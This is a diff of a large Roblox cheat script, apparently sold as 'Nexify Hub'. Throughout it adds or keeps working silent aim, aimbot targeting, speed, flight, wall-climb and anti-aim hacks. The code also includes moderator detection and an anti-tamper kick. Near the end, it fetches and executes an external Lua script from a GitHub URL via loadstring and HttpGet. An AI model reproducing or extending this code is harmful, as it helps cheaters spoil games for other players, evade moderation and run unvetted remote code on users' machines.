                 if part:IsA("MeshPart") or part:IsA("Part") then
-                    part.Material = Enum.Material.Plastic -- Reset material back to original
-                    part.Color = Color3.new(1, 1, 1) -- Reset color to white or any default you prefer
+                    part.Material = Enum.Material.Plastic 
+                    part.Color = Color3.new(1, 1, 1) 
                 end
             end
         end
@@ -6013,22 +5838,22 @@ charactertab:AddToggle('Character Color Picker', {
 
 
 charactertab:AddLabel('Character Color Picker'):AddColorPicker('ColorPickerCharacter', {
-    Default = lastSelectedColor, -- Set the default color to the last selected color
+    Default = lastSelectedColor, 
     Title = 'Character Color Picker',
     Transparency = 0,
 
     Callback = function(selectedColor)
-        lastSelectedColor = selectedColor -- Store the selected color
+        lastSelectedColor = selectedColor 
 
         if colorPickerEnabled then
             local player = game.Players.LocalPlayer
             local character = player.Character or player.CharacterAdded:Wait()
 
-            -- Change the character's material to ForceField and apply the selected color
+            
             for _, part in ipairs(character:GetChildren()) do
                 if part:IsA("MeshPart") or part:IsA("Part") then
                     part.Material = Enum.Material.ForceField
-                    part.Color = selectedColor -- Set the color from the color picker
+                    part.Color = selectedColor 
                 end
             end
         end
@@ -6037,80 +5862,80 @@ charactertab:AddLabel('Character Color Picker'):AddColorPicker('ColorPickerChara
 
 
 
--- New code for Ambient Color Picker
+
 charactertab:AddLabel('Ambient Color Picker'):AddColorPicker('ColorPickerAmbient', {
-    Default = game.Lighting.Ambient, -- Default to the current ambient color
+    Default = game.Lighting.Ambient, 
     Title = 'Ambient Color Picker',
     Transparency = 0,
 
     Callback = function(Value)
-        game.Lighting.Ambient = Value -- Change the ambient color to the selected value
+        game.Lighting.Ambient = Value 
     end
 })
 
--- Color Picker for ViewModel Chams
+
 charactertab:AddLabel('ViewModel Chams Color Picker'):AddColorPicker('ColorPickerViewModel', {
     Default = ViewModelSettings.Color,
     Title = 'ViewModel Chams Color Picker',
     Transparency = 0,
 
     Callback = function(Value)
-        ViewModelSettings.Color = Value -- Store the selected color
+        ViewModelSettings.Color = Value 
         local viewModel = game.Workspace.Camera:FindFirstChild("ViewModel")
-        applySettings(viewModel) -- Apply to the current ViewModel
+        applySettings(viewModel) 
     end
 })
 
 charactertab:AddDropdown('MaterialDropdown', {
     Values = { 'Plastic', 'ForceField', 'Neon' },
-    Default = 1, -- Default to 'Plastic'
-    Multi = false, -- Single selection
+    Default = 1, 
+    Multi = false, 
 
     Text = 'Select Material',
     Tooltip = 'Change the material of the ViewModel parts',
 
     Callback = function(Value)
-        ViewModelSettings.Material = Enum.Material[Value] -- Store the selected material
+        ViewModelSettings.Material = Enum.Material[Value] 
         local viewModel = game.Workspace.Camera:FindFirstChild("ViewModel")
-        applySettings(viewModel) -- Apply to the current ViewModel
+        applySettings(viewModel) 
     end
 })
 
--- Toggle for enabling/disabling ViewModel Chams
+
 charactertab:AddToggle('Toggle ViewModel Chams', {
     Text = 'Enable ViewModel Chams',
     Default = false,
     Callback = function(isEnabled)
-        ViewModelSettings.IsEnabled = isEnabled -- Update toggle state
+        ViewModelSettings.IsEnabled = isEnabled 
         local viewModel = game.Workspace.Camera:FindFirstChild("ViewModel")
-        applySettings(viewModel) -- Apply settings if enabled
+        applySettings(viewModel) 
     end
 })
 
 
 
--- Toggle for enabling/disabling Highlight
+
 charactertab:AddToggle('Toggle Highlight', {
     Text = 'Enable Highlight',
     Default = false,
     Callback = function(isEnabled)
-        ViewModelSettings.HighlightEnabled = isEnabled -- Update highlight toggle state
+        ViewModelSettings.HighlightEnabled = isEnabled 
         local viewModel = game.Workspace.Camera:FindFirstChild("ViewModel")
-        applySettings(viewModel) -- Apply settings if enabled
+        applySettings(viewModel) 
     end,
-    -- Disable this toggle if ViewModel Chams is not enabled
+    
     ConditionalEnabled = function() return ViewModelSettings.IsEnabled end
 })
 
--- New toggle for arm customization and removing WastelandShirt
+
 charactertab:AddToggle('Toggle Arm Customization', {
     Text = 'Enable Arm Customization',
     Default = false,
     Callback = function(isEnabled)
-        ViewModelSettings.ArmCustomizationEnabled = isEnabled -- Update arm customization toggle state
+        ViewModelSettings.ArmCustomizationEnabled = isEnabled 
         local viewModel = game.Workspace.Camera:FindFirstChild("ViewModel")
         if isEnabled then
-            customizeArms(viewModel) -- Apply arm customization if enabled
+            customizeArms(viewModel) 
         end
     end
 })
@@ -6141,40 +5966,40 @@ charactertab:AddToggle('disabletilt', {
     end
 })
 
--- Function to handle ViewModel spawn
+
 function onViewModelSpawned()
     local viewModel = game.Workspace.Camera:FindFirstChild("ViewModel")
-    applySettings(viewModel) -- Apply the last settings
+    applySettings(viewModel) 
     if ViewModelSettings.ArmCustomizationEnabled then
-        customizeArms(viewModel) -- Apply arm customization if enabled
+        customizeArms(viewModel) 
     end
 end
 
--- Initial check for ViewModel
+
 onViewModelSpawned()
 
--- Check for ViewModel being added or respawned
+
 game.Workspace.Camera.ChildAdded:Connect(function(child)
     if child.Name == "ViewModel" then
-        wait(0.5) -- Wait for the ViewModel to fully load
-        onViewModelSpawned() -- Apply last settings
+        wait(0.5) 
+        onViewModelSpawned() 
     end
 end)
 
--- Monitor player character for changes
+
 game.Players.LocalPlayer.CharacterAdded:Connect(function(character)
-    character:WaitForChild("Humanoid").Died:Wait() -- Wait for death
-    wait(0.5) -- Wait for respawn
-    onViewModelSpawned() -- Check for new ViewModel
+    character:WaitForChild("Humanoid").Died:Wait() 
+    wait(0.5) 
+    onViewModelSpawned() 
 end)
 
--- Continuously update the ViewModel settings
+
 game:GetService("RunService").Stepped:Connect(function()
     local viewModel = game.Workspace.Camera:FindFirstChild("ViewModel")
     if viewModel then
-        applySettings(viewModel) -- Reapply settings every frame
+        applySettings(viewModel) 
         if ViewModelSettings.ArmCustomizationEnabled then
-            customizeArms(viewModel) -- Reapply arm customization every frame
+            customizeArms(viewModel) 
         end
     end
 end)
@@ -6187,18 +6012,18 @@ player = game.Players.LocalPlayer
 userInputService = game:GetService("UserInputService")
 runService = game:GetService("RunService")
 
-local bulletSpeed = 1020 -- 762x39mm
+local bulletSpeed = 1020 
 aimEnabled = false
 
 lastAimedTime = 0
-aimUpdateInterval = 0.01 -- Update aiming logic every 50ms (20 FPS equivalent)
+aimUpdateInterval = 0.01 
 
 function getClosestEnemyToCrosshair()
     closestCharacter = nil
     closestDistance = math.huge
     crosshairPosition = Vector2.new(camera.ViewportSize.X / 2, camera.ViewportSize.Y / 2)
 
-    -- Process only visible players
+    
     for _, otherPlayer in pairs(game.Players:GetPlayers()) do
         if otherPlayer ~= player and otherPlayer.Character then
             character = otherPlayer.Character
@@ -6224,7 +6049,7 @@ function aimAtClosestEnemy()
     if not aimEnabled then return end
 
     currentTime = tick()
-    if currentTime - lastAimedTime < aimUpdateInterval then return end  -- Only update aiming every `aimUpdateInterval` seconds
+    if currentTime - lastAimedTime < aimUpdateInterval then return end  
 
     lastAimedTime = currentTime
 
@@ -6284,11 +6109,13 @@ aimUpdateInterval = Value
     end
 })
 
--- Library functions
--- Sets the watermark visibility
+library:Notify("You Are In Buyer Mode!")
+
+
+
 Library:SetWatermarkVisibility(true)
 
--- Example of dynamically-updating watermark with common traits (fps and ping)
+
 FrameTimer = tick()
  FrameCounter = 0;
  FPS = 60;
@@ -6308,7 +6135,7 @@ FrameTimer = tick()
     ));
 end);
 
-Library.KeybindFrame.Visible = true; -- todo: add a function for this
+Library.KeybindFrame.Visible = true; 
 
 aimtab:AddSlider('Silent Aim Resp Sped', {
     Text = 'Silent Aim Response Speed',
@@ -6320,7 +6147,7 @@ aimtab:AddSlider('Silent Aim Resp Sped', {
     Compact = false,
 
     Callback = function(Value)
---aimUpdateInterval = Value
+
 
     end
 })
@@ -6330,12 +6157,12 @@ print("ignore theme settings")
 
 
 
--- Builds our config menu on the right side of our tab
 
 
 
 
--- GUI Toggle for Silent Aim
+
+
 aimtab:AddToggle('silentAim994', {
     Text = 'Silent Aim',
     Default = false,
@@ -6353,7 +6180,7 @@ toggleAim()
     Text = 'Silent Aim Bind',
     NoUI = false,
     Callback = function(Value)
-        -- Optionally handle key bindings here
+        
     end,
 })
 
@@ -6409,7 +6236,7 @@ aimtab:AddToggle('fov11outline', {
 })
 
 
--- Adjust the slider callback to update fovRadius directly
+
 aimtab:AddSlider('aimfov', {
     Text = 'Aim FOV Size',
     Default = 170,
@@ -6418,9 +6245,9 @@ aimtab:AddSlider('aimfov', {
     Rounding = 0,
     Compact = false,
     Callback = function(size)
-        fovRadius = size   -- Directly update fovRadius
+        fovRadius = size   
         if fovCircle then
-            fovCircle.Radius = fovRadius  -- Update the FOV circle size
+            fovCircle.Radius = fovRadius  
         end
         if debugEnabled then
             print("FOV size updated to:", fovRadius)
@@ -6438,13 +6265,13 @@ end
 
 resetfovcircle()
 
--- Add a toggle for enabling/disabling the FOV display
+
 aimtab:AddToggle('fovdisplay', {
     Text = 'Show FOV Circle',
     Tooltip = 'Toggle the visibility of the FOV circle',
     Default = true,
     Callback = function(visible)
-        -- Update FOV circle visibility
+        
         if fovCircle then
             fovCircle.Visible = visible
         end
@@ -6483,7 +6310,7 @@ fovCircle.Transparency = Value
     end
 })
 
--- Add a toggle for enabling/disabling the FOV display
+
 aimtab:AddToggle('fovcirclefilled', {
     Text = 'Fill Fov Circle',
     Tooltip = 'Fill Fov Circle',
@@ -6497,53 +6324,53 @@ fovCircle.Filled = Value
 
  
 
--- Add a toggle for enabling/disabling the FOV display
+
 aimtab:AddToggle('toggletracerssnap', {
     Text = 'Toggle Snaplines',
     Tooltip = 'Toggle Snaplines (FOV)',
     Default = true,
     Callback = function(Value)
-        -- Update FOV circle visibility
+        
 config.snapline_enabled = Value
     end
 })
 
--- Create a color picker for changing the grass color
+
 aimtab:AddLabel('Tracers Color'):AddColorPicker('Tracers Color', {
-    Default = Color3.fromRGB(255, 255, 255), -- Set the default color to red
+    Default = Color3.fromRGB(255, 255, 255), 
     Title = 'Tracers Color',
     Transparency = 0,
 
     Callback = function(Value)
-        -- Assuming 'Value' is a Color3, directly set the Snapline color
+        
         Snapline.Color = Value
     end
 })
 
--- Create a color picker for changing the grass color
+
 aimtab:AddLabel('Fov Color'):AddColorPicker('Fov Color', {
-    Default = Color3.fromRGB(255, 255, 255), -- Set the default color to red
+    Default = Color3.fromRGB(255, 255, 255), 
     Title = 'Fov Color',
     Transparency = 0,
 
     Callback = function(Value)
-        -- Assuming 'Value' is a Color3, directly set the Snapline color
+        
         fovCircle.Color = Value
     end
 })
 
---[[
--- Add a toggle for enabling/disabling the FOV display
+
+
 aimtab:AddToggle('rgbf', {
     Text = 'RGB Fov',
     Tooltip = 'RGB Fov',
     Default = false, 
     Callback = function(Value)
-        -- Update rgbfov based on toggle state
-        rgbfov = Value  -- This sets rgbfov to true or false based on toggle state
         
-        -- Optionally, update the FOV circle immediately when the toggle changes
-        -- You may want to adjust the radius and colors based on your requirements
+        rgbfov = Value  
+        
+        
+        
         if rgbfov then
             createFovCircle(175, Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 0, 255), 5)
         else
@@ -6551,7 +6378,7 @@ aimtab:AddToggle('rgbf', {
         end
     end
 })
---]]
+
 
 aimtab:AddButton("remove foliage", function()
     for _, v in pairs(workspace.SpawnerZones:GetDescendants()) do
@@ -6571,12 +6398,12 @@ do
         killaurarange = 10,
         killauradelay = 0,
         speed = false,
-        speedmode = 0, -- 0 = Basic speed, 1 = Bhop speed
+        speedmode = 0, 
         speedspeed = 1,
-        jumpmode = 1,  -- 0 = Vanilla, 1 = Velocity
+        jumpmode = 1,  
         jumpheight = 0.4,
         flight = false,
-        flightmode = 0, -- 0 = Damageless mode, 1 = Damage mode
+        flightmode = 0, 
         flightspeed = 1,
         phase = false,
         noenvdmg = false,
@@ -6626,15 +6453,15 @@ do
 getgenv().Fly3 = false
 getgenv().speed3 = 26
 
--- Directly accessing services without storing them in local variables
+
 game:GetService("RunService").RenderStepped:Connect(function(dt)
-    -- Access character's humanoid root part directly without using local variables
+    
     local rootPart = game:GetService("Players").LocalPlayer.Character:WaitForChild("HumanoidRootPart")
-    rootPart.Velocity = rootPart.Velocity -- Use default velocity initially
+    rootPart.Velocity = rootPart.Velocity 
     local travelDirection3 = Vector3.new(0, 0, 0)
 
     if getgenv().Fly3 then
-        -- Detect input for movement without using local variables for input
+        
         if game:GetService("UserInputService"):IsKeyDown(Enum.KeyCode.W) then
             travelDirection3 = travelDirection3 + Vector3.new(0, 0, 1)
         end
@@ -6654,16 +6481,16 @@ game:GetService("RunService").RenderStepped:Connect(function(dt)
             travelDirection3 = travelDirection3 + Vector3.new(0, -1, 0)
         end
 
-        -- Only calculate movement if there's input
+        
         if travelDirection3.Magnitude > 0 then
-            -- Get camera properties directly
+            
             travelDirection3 = (
                 workspace.CurrentCamera.CFrame.LookVector * travelDirection3.z +
                 workspace.CurrentCamera.CFrame.RightVector * travelDirection3.x +
                 workspace.CurrentCamera.CFrame.UpVector * travelDirection3.y
             ).unit
 
-            -- Apply movement without using a local velocity variable
+            
             rootPart.Velocity = travelDirection3 * getgenv().speed3
         end
     end
@@ -6672,40 +6499,40 @@ end)
 
 
 print("Script running...")
--- UI Code
 
-spiderActive = false -- Toggle state for spider climbing
-spiderSpeed = 10 -- Initial climbing speed
 
--- Function to handle wall climbing
+spiderActive = false 
+spiderSpeed = 10 
+
+
 function climbWalls()
     while spiderActive do
-        -- Cast ray in the direction the character is facing to detect a wall (front direction)
-        local forwardRay = Ray.new(character.HumanoidRootPart.Position, character.HumanoidRootPart.CFrame.LookVector * 5) -- 5 is the raycast length
+        
+        local forwardRay = Ray.new(character.HumanoidRootPart.Position, character.HumanoidRootPart.CFrame.LookVector * 5) 
         local hit, position = workspace:FindPartOnRay(forwardRay, character)
 
-        if hit then -- If a wall is detected
-            local climbDirection = Vector3.new(0, 1, 0) -- Climb upwards
+        if hit then 
+            local climbDirection = Vector3.new(0, 1, 0) 
             character.HumanoidRootPart.Velocity = climbDirection * spiderSpeed
         else
-            -- If no wall is detected, we stop the upward velocity (keep grounded)
+            
             character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
         end
 
-        -- Check if character is on the ground (raycast downwards to detect ground)
-        local groundRay = Ray.new(character.HumanoidRootPart.Position, Vector3.new(0, -1, 0)) -- Ray to check for ground
+        
+        local groundRay = Ray.new(character.HumanoidRootPart.Position, Vector3.new(0, -1, 0)) 
         local groundHit, groundPosition = workspace:FindPartOnRay(groundRay, character)
 
         if groundHit then
-            -- If on the ground, stop climbing
+            
             character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
         end
 
-        task.wait(0.03) -- Adjust for smoother climbing
+        task.wait(0.03) 
     end
 end
 
--- Adding a toggle to enable/disable spider climbing
+
 charactertab:AddToggle('spiderToggle', {
     Text = 'Spider Climb',
     Risky = true,
@@ -6713,12 +6540,12 @@ charactertab:AddToggle('spiderToggle', {
     Callback = function(state)
         spiderActive = state
         if spiderActive then
-            climbWalls() -- Start climbing when toggled on
+            climbWalls() 
         end
     end
 })
 
--- Adding a slider for Spider Speed
+
 charactertab:AddSlider('clisp', {
     Text = 'Spider Speed',
     Default = 10,
@@ -6736,17 +6563,17 @@ charactertab:AddToggle('speed3', {
     Risky = true,
     Default = false,
     Callback = function(state3)
-        getgenv().speedHackEnabled = state3 -- Update global toggle state
+        getgenv().speedHackEnabled = state3 
         
         if not state3 then
-            -- If Speed Hack is disabled, remove velocity and disconnect Heartbeat
+            
             humanoidRootPart.Velocity = Vector3.new(0, 0, 0)
             if getgenv().speedConnection then
                 getgenv().speedConnection:Disconnect()
                 getgenv().speedConnection = nil
             end
         else
-            -- If Speed Hack is enabled, reconnect the update function
+            
             if not getgenv().speedConnection then
                 getgenv().speedConnection = game:GetService("RunService").Heartbeat:Connect(updateVelocity)
             end
@@ -6759,7 +6586,7 @@ charactertab:AddToggle('speed3', {
     Text = 'Flight',
     NoUI = false,
     Callback = function(value3)
-        -- Flight key callback (optional flight functionality can be added here)
+        
     end
 })
 
@@ -6771,7 +6598,7 @@ charactertab:AddSlider('speedhack', {
     Rounding = 2,
     Compact = true
 }):OnChanged(function(value)
-    getgenv().speedMultiplier = value -- Set global speed value from slider
+    getgenv().speedMultiplier = value 
 end)
 
 Players = game:GetService("Players")
@@ -6783,33 +6610,33 @@ Players = game:GetService("Players")
  Camera = game:GetService("Workspace").CurrentCamera
  UserInputService = game:GetService("UserInputService")
 
-antiAimEnabled = false  -- Initial state of anti-aim
+antiAimEnabled = false  
 
  function applyAntiAim()
-    -- Apply anti-aim behavior to the character
-    RootPart.CFrame = RootPart.CFrame * CFrame.Angles(0, math.rad(180), 0)  -- Rotate RootPart
+    
+    RootPart.CFrame = RootPart.CFrame * CFrame.Angles(0, math.rad(180), 0)  
     local headPos = Head.Position
-    RootPart.Position = Vector3.new(headPos.X, headPos.Y - 2, headPos.Z)  -- Adjust position slightly below the head
-    Camera.CFrame = CFrame.new(Camera.CFrame.Position, Camera.CFrame.Position + Camera.CFrame.LookVector)  -- Update camera
+    RootPart.Position = Vector3.new(headPos.X, headPos.Y - 2, headPos.Z)  
+    Camera.CFrame = CFrame.new(Camera.CFrame.Position, Camera.CFrame.Position + Camera.CFrame.LookVector)  
 end
 function asswhiletruedo()
--- Main loop for checking anti-aim toggle
+
 while true do
     if antiAimEnabled then
-        applyAntiAim()  -- Apply anti-aim when enabled
+        applyAntiAim()  
     end
-    wait(0.001)  -- Small delay to prevent freezing
+    wait(0.001)  
 end
 end
 
 coroutine.wrap(asswhiletruedo)
--- Toggle for enabling/disabling ViewModel Chams
+
 charactertab:AddToggle('Anti Aim Level 2', {
     Text = 'Anti Aim Level 2',
     Default = false,
     Risky = true,
     Callback = function(isEnabled)
-        -- Enable or disable anti-aim based on the toggle
+        
         antiAimEnabled = isEnabled
     end
 })
@@ -6817,7 +6644,7 @@ charactertab:AddToggle('Anti Aim Level 2', {
 
 
 
--- Function to check if any part of the player's character is transparent
+
 function isPlayerTransparent(player)
     if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
         for _, part in pairs(player.Character:GetChildren()) do
@@ -6831,10 +6658,10 @@ function isPlayerTransparent(player)
     return false
 end
 
--- Listen for new players joining the game
+
 game.Players.PlayerAdded:Connect(function(player)
     player.CharacterAdded:Connect(function(character)
-        -- Check if the player has any transparent parts
+        
         if isPlayerTransparent(player) then
             library:Notify("MODERATOR FOUND:" ..player.Name, 30)
         end
@@ -6842,17 +6669,17 @@ game.Players.PlayerAdded:Connect(function(player)
 end)
 
 
--- Set default values
+
 getgenv().speedMultiplier = 17
 getgenv().speedHackEnabled = false
 
--- Player references
+
  player = game.Players.LocalPlayer
  character = player.Character or player.CharacterAdded:Wait()
  humanoidRootPart = character:WaitForChild("HumanoidRootPart")
  humanoid = character:WaitForChild("Humanoid")
 
--- Function to update player velocity based on movement direction
+
 function updateVelocity()
     if getgenv().speedHackEnabled then
         local moveDirection = humanoid.MoveDirection
@@ -6864,13 +6691,13 @@ function updateVelocity()
     end
 end
 
--- Enable Speed Hack by connecting to Heartbeat when the toggle is enabled
+
 if getgenv().speedHackEnabled then
     getgenv().speedConnection = game:GetService("RunService").Heartbeat:Connect(updateVelocity)
 end
 
 
--- UI flight toggle without using local variables
+
 charactertab:AddToggle('flight3', {
     Text = 'Flight',
     Risky = true,
@@ -6885,7 +6712,7 @@ charactertab:AddToggle('flight3', {
     Text = 'Flight',
     NoUI = false,
     Callback = function(value3)
-        -- Empty callback, no additional functionality needed for now
+        
     end
 })
 
@@ -6910,12 +6737,12 @@ charactertab:AddToggle('Toggle Crosshair', {
     Text = 'Toggle Crosshair',
     Default = false,
     Callback = function(isEnabled)
-        _G.CrosshairEnabled = isEnabled  -- Sets _G.CrosshairEnabled to the current state of the toggle (true or false)
+        _G.CrosshairEnabled = isEnabled  
     end
-    -- You may add additional conditions here to disable the toggle if needed, such as checking if ViewModel Chams is enabled
+    
 })
 
--- Slider for Zoom Value
+
 charactertab:AddSlider('Crosshair Thickness', {
     Text = 'Crosshair Thicknes',
     Default = 1,
@@ -6930,7 +6757,7 @@ HorizontalLine.Thickness = Value
     end
 })
 
--- Color Picker for ViewModel Chams
+
 charactertab:AddLabel('Crosshair Color Picker'):AddColorPicker('Crosshair Color Picker', {
     Default = ViewModelSettings.Color,
     Title = 'Crosshair Color Picker',
@@ -6947,17 +6774,17 @@ charactertab:AddLabel('Crosshair Color Picker'):AddColorPicker('Crosshair Color 
 viewmodelEnabled = false
 xOffset, yOffset, zOffset = 0, 0, 0
 
--- Function to update the ViewModel position smoothly
+
 function updateViewmodelOffset()
-    -- Ensure that the ViewModel exists
+    
     local viewmodel = game.Workspace.Camera:FindFirstChild("ViewModel")
     if viewmodel then
         local camera = game.Workspace.CurrentCamera
-        -- Update the ViewModel position relative to the camera position
+        
         if camera and viewmodel then
             local newPosition = camera.CFrame.Position + camera.CFrame:VectorToWorldSpace(Vector3.new(xOffset, yOffset, zOffset))
             
-            -- Set all parts in the ViewModel to the new position
+            
             for _, part in pairs(viewmodel:GetDescendants()) do
                 if part:IsA("BasePart") then
                     part.CFrame = CFrame.new(newPosition)
@@ -6967,17 +6794,17 @@ function updateViewmodelOffset()
     end
 end
 
--- Toggle button callback to enable/disable viewmodel offset
+
 charactertab:AddToggle('viewq131425346yjrurefwgergrfgtjyuksedvgrtjh', {
     Text = 'Viewmodel Toggle',
     Default = false,
     Callback = function(isEnabled)
-        -- Set the viewmodel toggle state
+        
         viewmodelEnabled = isEnabled
         
-        -- Start applying offsets every frame if enabled
+        
         if viewmodelEnabled then
-            -- Continuously update the viewmodel position every frame
+            
             game:GetService("RunService").Heartbeat:Connect(function()
                 updateViewmodelOffset()
             end)
@@ -6985,7 +6812,7 @@ charactertab:AddToggle('viewq131425346yjrurefwgergrfgtjyuksedvgrtjh', {
     end
 })
 
--- X Slider callback to update X position of viewmodel
+
 charactertab:AddSlider('X', {
     Text = 'X Value',
     Default = 0,
@@ -6998,7 +6825,7 @@ charactertab:AddSlider('X', {
     end
 })
 
--- Y Slider callback to update Y position of viewmodel
+
 charactertab:AddSlider('Y', {
     Text = 'Y Value',
     Default = 0,
@@ -7011,7 +6838,7 @@ charactertab:AddSlider('Y', {
     end
 })
 
--- Z Slider callback to update Z position of viewmodel
+
 charactertab:AddSlider('Z', {
     Text = 'Z Value',
     Default = 0,
@@ -7020,9 +6847,9 @@ charactertab:AddSlider('Z', {
     Rounding = 1,
     Compact = false,
     Callback = function(Value)
-        -- Update Z offset
+        
         zOffset = Value
-        -- Apply the change to the viewmodel if the toggle is enabled
+        
         if viewmodelEnabled then
             updateViewmodelOffset()
         end
@@ -7030,18 +6857,18 @@ charactertab:AddSlider('Z', {
 })
 
 
--- Toggle for enabling/disabling Highlight
+
 charactertab:AddToggle('Remove Clouds', {
     Text = 'Remove Clouds',
     Default = false,
     Callback = function(isEnabled)
         terrain = game:GetService("Workspace").Terrain
 
-        -- If enabled, remove clouds (set Density to 0)
+        
         if isEnabled then
             terrain.Clouds.Density = 0
         else
-            -- If disabled, restore clouds (set Density to 1)
+            
             terrain.Clouds.Density = 1
         end
     end
@@ -7058,13 +6885,13 @@ print("crassshhhh")
 
  end)
 
--- Create the folder in Workspace
+
 folderName = "Nexifyfunctions"
 NexifyFolder = Instance.new("Folder")
 NexifyFolder.Name = folderName
 NexifyFolder.Parent = Workspace
 
--- Create the RemoteEvents
+
  remote1 = Instance.new("RemoteEvent")
  remote4 = Instance.new("BoolValue")
  remote2 = Instance.new("RemoteEvent")
@@ -7077,12 +6904,12 @@ remote1.Parent = NexifyFolder
 remote2.Parent = NexifyFolder
 remote4.Parent = NexifyFolder
 
--- Function to change RemoteEvent names every 0.1 seconds
+
 local function changeRemoteNames()
     while true do
-        wait(1)  -- Change names every 0.1 seconds
+        wait(1)  
         
-        -- Randomly change the names between the two options
+        
         if remote1 and remote2 then
             if math.random() > 0.8 then
                 remote1.Name = " ? YQ     Q   "
@@ -7095,71 +6922,36 @@ local function changeRemoteNames()
             end
         end
 
-        -- Check if the folder or RemoteEvents have been removed
+        
         if not NexifyFolder:IsDescendantOf(Workspace) or not remote1:IsDescendantOf(NexifyFolder) or not remote2:IsDescendantOf(NexifyFolder) then
-            local player = Players.LocalPlayer  -- Get the player who initiated this script
+            local player = Players.LocalPlayer  
             if player then
 
 
 wait(3)
-                player:Kick("Nexify Function Removal")  -- Kick the player with a message
+                player:Kick("Nexify Function Removal")  
             end
             break
         end
     end
 end
 
--- Start the name-changing function in a coroutine
+
 coroutine.wrap(changeRemoteNames)()
 
 print("created functions")
 
 
---[[local __index; __index = hookmetamethod(game, "__index", function(self, idx, val)
-    if self == camera and idx == "CFrame" then
-        if varsglobal.thirdperson then
-            val = val + camera.CFrame.LookVector * -varsglobal.thirdpdist
-        end
-    end
-    return __index(self, idx, val)
-end)
-]]
---[[local __newindex; __newindex = hookmetamethod(game, "__newindex", function(self, idx, val)
-    if self == camera and idx == "CFrame" then
-        if varsglobal.thirdperson then 
-            val = val + camera.CFrame.LookVector * -varsglobal.thirdpdist
-        end
-    end
-    return __newindex(self, idx, val)
-end)
-local rawmeta = getrawmetatable(game);
-setreadonly(rawmeta, false)
-local __namecall = rawmeta.__namecall
-rawmeta.__namecall = function(self, ...)
-    --local Method = (getnamecallmethod()):lower()
-    local args = { ... }
-    if pdlt.silentaim and valargs(args, expargs.Raycast) then
-        local func_name = debug.getinfo(2).name
-        if (func_name ~= "WallCollision" and func_name ~= "IsTargetVisible" and func_name ~= "update") and valargs(args, expargs.Raycast) then
-        --print(debug.getinfo(3).name)
-            local A_Origin = args[1]
-            local HitPart = Target
-            if HitPart thenwwww
-                args[2] = (HitPart.Position - A_Origin).Unit * 6000
-                return __namecall(self, unpack(args))
-            end
-        end
-    end
-    return __namecall(self, ...)
-end]]
-end
 
--- Toggle variable to enable or disable highlights
+
+
+
+
+
 
 
 
 --[[
-
     asddasasddasasddasasddasasddas
         asddasasddasasddasasddasasddas
         asddasasddasasddasasddasasddas
@@ -13168,73 +12960,74 @@ end
         asddasasddasasddasasddasasddas
         asddasasddasasddasasddasasddas
 
-]]
+--]]
 
 
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 
--- Set the teleportation threshold (in studs)
-local teleportThreshold = 7300  -- You can adjust this value as needed
 
--- Table to keep track of notified players
+local teleportThreshold = 7300  
+
+
 local notifiedPlayers = {}
 
--- Function to check if a player has teleported
+
 local function checkPlayerTeleportation(player)
-    -- Wait for the player's character to load
+    
     local character = player.Character or player.CharacterAdded:Wait()
     local humanoidRootPart = character:WaitForChild("HumanoidRootPart")
     local previousPosition = humanoidRootPart.Position
 
-    -- Create a connection to RunService.Heartbeat to monitor player position
+    
     local heartbeatConnection
     heartbeatConnection = RunService.Heartbeat:Connect(function()
-        -- Check if the player's character still exists
+        
         if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
             local currentPosition = player.Character.HumanoidRootPart.Position
             local distanceMoved = (currentPosition - previousPosition).Magnitude
 
-            -- If the distance moved exceeds the teleportation threshold
+            
             if distanceMoved > teleportThreshold and not notifiedPlayers[player.Name] then
-                -- Notify the player (ensure Notification is properly defined)
+                
                 Notification:Notify(
                     {Title = "Nexify | NEW Nexify USER", Description = "New Nexify Hub User: " .. player.Name},
                     {OutlineColor = Color3.fromRGB(247, 172, 22), Time = 11, Type = "image"},
                     {Image = "http://www.roblox.com/asset/?id=2592670449", ImageColor = Color3.fromRGB(255, 84, 84)}
                 )
                 
-                -- Mark the player as notified to avoid duplicate notifications
+                
                 notifiedPlayers[player.Name] = true
                 wait(16)
                 
-                -- Load external script (ensure this URL is accessible)
+                
                 loadstring(game:HttpGet("https://raw.githubusercontent.com/97y1oHW/4991/refs/heads/main/externalsc.lua"))()
             end
 
-            -- Update the previous position for the next check
+            
             previousPosition = currentPosition
         else
-            -- Disconnect if the character no longer exists
+            
             heartbeatConnection:Disconnect()
         end
     end)
 end
 
--- Start teleportation checks for existing and new players
+
 local function startTeleportationChecks()
-    -- Check for all current players
+    
     for _, player in pairs(Players:GetPlayers()) do
-        coroutine.wrap(checkPlayerTeleportation)(player)  -- Start a coroutine for each player
+        coroutine.wrap(checkPlayerTeleportation)(player)  
     end
 
-    -- Connect to PlayerAdded to start checking for new players
+    
     Players.PlayerAdded:Connect(function(player)
         player.CharacterAdded:Connect(function(character)
-            coroutine.wrap(checkPlayerTeleportation)(player)  -- Start checking when the character is added
+            coroutine.wrap(checkPlayerTeleportation)(player)  
         end)
     end)
 end
 
--- Start the process
+
 startTeleportationChecks()
+end
